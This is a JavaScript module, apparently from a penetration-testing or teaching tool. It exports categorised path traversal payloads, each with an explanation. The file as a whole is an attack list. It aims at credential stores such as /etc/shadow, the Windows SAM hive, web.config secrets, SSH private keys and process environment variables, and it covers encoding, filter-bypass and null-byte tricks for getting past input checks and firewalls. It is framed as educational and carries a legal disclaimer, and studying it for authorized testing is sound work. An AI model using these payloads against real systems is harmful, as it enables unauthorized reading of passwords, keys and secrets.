// Path Traversal Payload Generator - Educational Penetration Testing Tool
// WARNING: For authorized testing and educational purposes only

export const PATH_TRAVERSAL_CATEGORIES = {
  BASIC: 'Basic Traversal',
  ENCODING: 'Encoded Traversal',
  FILTER_BYPASS: 'Filter Bypass',
  WINDOWS: 'Windows Targets',
  LINUX: 'Linux Targets',
  NULL_BYTE: 'Null Byte Injection',
};

export const payloads = {
  BASIC: [
    {
      name: 'Single level up',
      description: 'Navigate one directory up',
      payload: `../`,
      explanation: '../ navigates one directory level upward.',
    },
    {
      name: 'Two levels up',
      description: 'Navigate two directories up',
      payload: `../../`,
      explanation: 'Chains ../ to navigate multiple directory levels.',
    },
    {
      name: 'Linux passwd from web root',
      description: 'Access /etc/passwd from typical web root',
      payload: `../../../etc/passwd`,
      explanation: 'Three levels up from a typical /var/www/html location reaches the filesystem root.',
    },
    {
      name: 'Deep traversal to /etc/passwd',
      description: 'Maximum depth traversal for /etc/passwd',
      payload: `../../../../../../../../etc/passwd`,
      explanation: 'Excessive ../ sequences still resolve to root, ensuring the payload works regardless of depth.',
    },
    {
      name: 'Windows SAM file',
      description: 'Access Windows SAM database',
      payload: `..\\..\\..\\Windows\\System32\\config\\SAM`,
      explanation: 'Windows uses backslashes; SAM contains local account password hashes.',
    },
    {
      name: 'Windows win.ini',
      description: 'Classic Windows config file',
      payload: `..\\..\\..\\Windows\\win.ini`,
      explanation: 'win.ini is a classic indicator file used to verify path traversal on Windows.',
    },
    {
      name: 'Linux shadow file',
      description: 'Access /etc/shadow (requires root)',
      payload: `../../../etc/shadow`,
      explanation: '/etc/shadow contains hashed passwords — readable only by root.',
    },
  ],

  ENCODING: [
    {
      name: 'URL encoded ../',
      description: 'Percent-encode the traversal sequence',
      payload: `%2e%2e%2f`,
      explanation: '../ URL-encoded as %2e%2e%2f to bypass basic input filters.',
    },
    {
      name: 'Double URL encoded',
      description: 'Double-encode for WAF bypass',
      payload: `%252e%252e%252f`,
      explanation: 'Double encoding (%25 = %) causes the server to decode twice, resulting in ../.',
    },
    {
      name: 'UTF-8 encoded ../',
      description: 'Unicode representation of ../',
      payload: `..%c0%af`,
      explanation: 'Overlong UTF-8 encoding of / (0xC0 0xAF) exploits incorrect Unicode decoding.',
    },
    {
      name: 'Backslash encoding',
      description: 'Use backslash for Windows bypass',
      payload: `..%5c`,
      explanation: '%5c is the URL encoding of backslash (\\), used for Windows path traversal.',
    },
    {
      name: '16-bit Unicode encoding',
      description: 'Unicode backslash bypass',
      payload: `..%u2215`,
      explanation: 'Unicode forward slash (U+2215) may be decoded to / by some frameworks.',
    },
    {
      name: 'Mix of encodings',
      description: 'Combined encoding evasion',
      payload: `..%2F..%2F..%2Fetc%2Fpasswd`,
      explanation: 'Mixed URL encoding of the full path to bypass inconsistent decoders.',
    },
    {
      name: 'Null byte encoded',
      description: 'Null byte to truncate extension',
      payload: `../../../etc/passwd%00`,
      explanation: 'URL-encoded null byte may truncate a forced file extension (e.g., .php).',
    },
  ],

  FILTER_BYPASS: [
    {
      name: 'Double dot bypass (....//)',
      description: 'Bypass naive ../ stripping',
      payload: `....//....//....//etc/passwd`,
      explanation: 'After removing ../, the remaining ../ from ....// still traverses.',
    },
    {
      name: 'Slash variation',
      description: 'Mix forward and backslashes',
      payload: `..\\../..\\../etc/passwd`,
      explanation: 'Mixed slashes may confuse filters that only check one type.',
    },
    {
      name: 'Repeated ../',
      description: 'Nested duplication of traversal',
      payload: `..././..././..././etc/passwd`,
      explanation: 'After ./ is stripped, ../ remains — bypasses filters removing ./ sequences.',
    },
    {
      name: 'Absolute path injection',
      description: 'Use absolute path directly',
      payload: `/etc/passwd`,
      explanation: 'If the application accepts absolute paths without validation.',
    },
    {
      name: 'Path with query string',
      description: 'Append query string to confuse parsers',
      payload: `../../../etc/passwd?`,
      explanation: 'Trailing ? may confuse path normalization in some frameworks.',
    },
    {
      name: 'Base path injection',
      description: 'Override base path with absolute reference',
      payload: `file:///etc/passwd`,
      explanation: 'File URI scheme forces reading a local file on some XML/XSLT processors.',
    },
  ],

  WINDOWS: [
    {
      name: 'Windows hosts file',
      description: 'Read Windows hosts file',
      payload: `..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts`,
      explanation: 'hosts file maps hostnames to IPs and may reveal internal network structure.',
    },
    {
      name: 'Windows boot.ini',
      description: 'Read Windows boot configuration',
      payload: `..\\..\\..\\boot.ini`,
      explanation: 'boot.ini reveals OS version and configuration on older Windows systems.',
    },
    {
      name: 'IIS web.config',
      description: 'Read ASP.NET web.config for credentials',
      payload: `..\\web.config`,
      explanation: 'web.config may contain database connection strings and secret keys.',
    },
    {
      name: 'Windows environment file',
      description: 'Read Windows System32 config',
      payload: `..\\..\\..\\Windows\\System32\\config\\system`,
      explanation: 'System hive contains registry settings including service credentials.',
    },
    {
      name: 'IIS application pool',
      description: 'Application configuration file',
      payload: `..\\..\\inetpub\\wwwroot\\web.config`,
      explanation: 'Application root web.config often contains credentials and secrets.',
    },
    {
      name: 'Windows Event Log',
      description: 'Read Windows event log',
      payload: `..\\..\\..\\Windows\\System32\\winevt\\Logs\\Security.evtx`,
      explanation: 'Security event log contains authentication events and audit information.',
    },
  ],

  LINUX: [
    {
      name: '/etc/passwd',
      description: 'User account information',
      payload: `../../../etc/passwd`,
      explanation: 'Lists all system users, their UIDs, and default shells.',
    },
    {
      name: '/etc/shadow',
      description: 'Password hashes (root required)',
      payload: `../../../etc/shadow`,
      explanation: 'Contains hashed user passwords — only readable by root.',
    },
    {
      name: '/etc/hosts',
      description: 'System hostname mappings',
      payload: `../../../etc/hosts`,
      explanation: 'Reveals internal hostnames and IP address mappings.',
    },
    {
      name: '/proc/self/environ',
      description: 'Process environment variables',
      payload: `../../../proc/self/environ`,
      explanation: 'Environment variables of the running web server process, may include credentials.',
    },
    {
      name: '/proc/self/cmdline',
      description: 'Process command line arguments',
      payload: `../../../proc/self/cmdline`,
      explanation: 'Shows the command used to start the process, including arguments and paths.',
    },
    {
      name: 'Apache access.log',
      description: 'Web server access log',
      payload: `../../../var/log/apache2/access.log`,
      explanation: 'Access logs may enable log poisoning attacks when combined with LFI.',
    },
    {
      name: 'SSH private key',
      description: "Read user's SSH private key",
      payload: `../../../home/user/.ssh/id_rsa`,
      explanation: "Reading SSH private keys enables passwordless authentication.",
    },
    {
      name: '/etc/crontab',
      description: 'System cron jobs',
      payload: `../../../etc/crontab`,
      explanation: 'Cron jobs may run privileged scripts with hard-coded credentials.',
    },
  ],

  NULL_BYTE: [
    {
      name: 'Null byte to bypass extension',
      description: 'Terminate path before forced extension',
      payload: `../../../etc/passwd\x00`,
      explanation: 'Null byte \\x00 truncates the string before a forced .php or .txt extension.',
    },
    {
      name: 'URL encoded null byte',
      description: 'Percent-encoded null byte',
      payload: `../../../etc/passwd%00`,
      explanation: 'URL-encoded version of null byte — effective when decoded server-side.',
    },
    {
      name: 'Null byte with extension',
      description: 'Null byte before a disguised extension',
      payload: `../../../etc/passwd%00.jpg`,
      explanation: 'Makes the file look like a .jpg while the null byte causes it to be read as /etc/passwd.',
    },
    {
      name: 'Double null byte',
      description: 'Double null byte for redundancy',
      payload: `../../../etc/passwd%00%00`,
      explanation: 'Double null byte for environments that strip a single null byte.',
    },
    {
      name: 'Null byte in Windows path',
      description: 'Null byte in Windows path traversal',
      payload: `..\\..\\..\\Windows\\win.ini%00`,
      explanation: 'Windows-targeted null byte injection to bypass extension validation.',
    },
  ],
};

export function getAllCategories() {
  return Object.entries(PATH_TRAVERSAL_CATEGORIES).map(([key, label]) => ({
    key,
    label,
  }));
}

export function getPayloadsByCategory(categoryKey) {
  return payloads[categoryKey] || [];
}

export const QUICK_TEST_PAYLOADS = [
  '../',
  '../../',
  '../../../etc/passwd',
  '..%2F..%2F..%2Fetc%2Fpasswd',
  '....//....//etc/passwd',
  '..\\..\\..\\Windows\\win.ini',
  '../../../etc/passwd%00',
];

export const LEGAL_DISCLAIMER = `⚠️ LEGAL & ETHICAL DISCLAIMER: This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY. Only use with explicit written authorization from the system owner. Unauthorized path traversal attacks are illegal and may result in criminal prosecution.`;
